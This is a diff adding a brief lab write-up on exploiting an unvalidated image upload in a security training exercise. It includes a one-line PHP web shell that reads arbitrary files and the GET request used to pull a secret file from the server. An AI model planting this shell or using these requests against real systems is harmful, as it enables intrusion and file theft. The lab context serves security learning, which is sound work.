@@ -1,0 +1,21 @@
+Lab #1 - Remote code execution via web shell upload
+
+Vulnerabilities - This lab contains a vulnerable image upload function. It doesn't perform any validation on the files users upload before storing them on the server's filesystem.
+
+Goal - upload a basic PHP web shell and use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
+
+Credentials: wiener:peter
+
+Analysis: 
+- log in with account: wiener:peter
+- there is an image upload function that I can upload every file type without properly verifying.
+
+Solution: 
+- create a shell.php file which helps to execute code Remote
+    <?php echo file_get_contents($_GET['filename']); ?>
+
+- upload this file by upload image functionailty.
+- make a GET request to exfiltrate the contents of the file /home/carlos/secret.
+    GET /files/avatars/shell.php?filename=/home/carlos/secret HTTP/2
+
+=> get the result: gSn3nb434qJnydnTrIjjiXY1QP6AloXQ
